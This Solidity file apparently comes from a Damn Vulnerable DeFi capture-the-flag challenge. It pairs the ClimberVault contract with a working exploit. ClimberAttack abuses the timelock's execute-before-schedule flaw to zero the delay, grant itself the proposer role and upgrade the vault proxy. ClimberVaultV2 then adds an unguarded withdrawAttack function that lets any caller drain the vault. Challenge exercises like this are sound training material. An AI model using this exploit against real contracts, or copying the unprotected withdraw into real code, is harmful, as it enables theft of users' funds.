// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./ClimberTimelock.sol";

/**
 * @title ClimberVault
 * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    modifier onlySweeper() {
        require(msg.sender == _sweeper, "Caller must be sweeper");
        _;
    }

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function initialize(address admin, address proposer, address sweeper) initializer external {
        // Initialize inheritance chain
        __Ownable_init();
        __UUPSUpgradeable_init();

        // Deploy timelock and transfer ownership to it
        transferOwnership(address(new ClimberTimelock(admin, proposer)));

        _setSweeper(sweeper);
        _setLastWithdrawal(block.timestamp);
        _lastWithdrawalTimestamp = block.timestamp;
    }

    // Allows the owner to send a limited amount of tokens to a recipient every now and then
    function withdraw(address tokenAddress, address recipient, uint256 amount) external onlyOwner {
        require(amount <= WITHDRAWAL_LIMIT, "Withdrawing too much");
        require(block.timestamp > _lastWithdrawalTimestamp + WAITING_PERIOD, "Try later");
        
        _setLastWithdrawal(block.timestamp);

        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(recipient, amount), "Transfer failed");
    }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address tokenAddress) external onlySweeper {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(_sweeper, token.balanceOf(address(this))), "Transfer failed");
    }

    function getSweeper() external view returns (address) {
        return _sweeper;
    }

    function _setSweeper(address newSweeper) internal {
        _sweeper = newSweeper;
    }

    function getLastWithdrawalTimestamp() external view returns (uint256) {
        return _lastWithdrawalTimestamp;
    }

    function _setLastWithdrawal(uint256 timestamp) internal {
        _lastWithdrawalTimestamp = timestamp;
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}

contract ClimberAttack {

    address payable private timeLockContract;
    address private climberVaultAddress;
    address private climberVaultV2Address;

    address[] private targets;
    uint256[] private values = [0, 0, 0, 0];
    bytes[] private dataElements;

    constructor(
        address payable _timeLockContract,
        address _climberVaultAddress,
        address _climberVaultV2Address
    ) {
        timeLockContract = _timeLockContract;
        climberVaultAddress = _climberVaultAddress;
        climberVaultV2Address = _climberVaultV2Address;
    }

    function _initValuesForAttack() private {

        targets.push(timeLockContract);
        targets.push(timeLockContract);
        targets.push(climberVaultAddress);
        targets.push(address(this));

        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));
        dataElements.push(abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this)));
        dataElements.push(abi.encodeWithSelector(
            UUPSUpgradeable.upgradeTo.selector,
            climberVaultV2Address
        ));
        dataElements.push(abi.encodeWithSelector(
            this.scheduleAction.selector,
            timeLockContract,
            climberVaultAddress,
            climberVaultV2Address
        ));
    }

    function attack() external {
        _initValuesForAttack();

        ClimberTimelock(timeLockContract).execute(
            targets,
            values,
            dataElements,
            0
        );
    }

    function scheduleAction() external {
        ClimberTimelock(timeLockContract).schedule(
            targets,
            values,
            dataElements,
            0
        );
    }

}

contract ClimberVaultV2 is ClimberVault {

    function withdrawAttack(address tokenAddress, address recipient, uint256 amount) external {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(recipient, amount), "Transfer failed");
    }
}
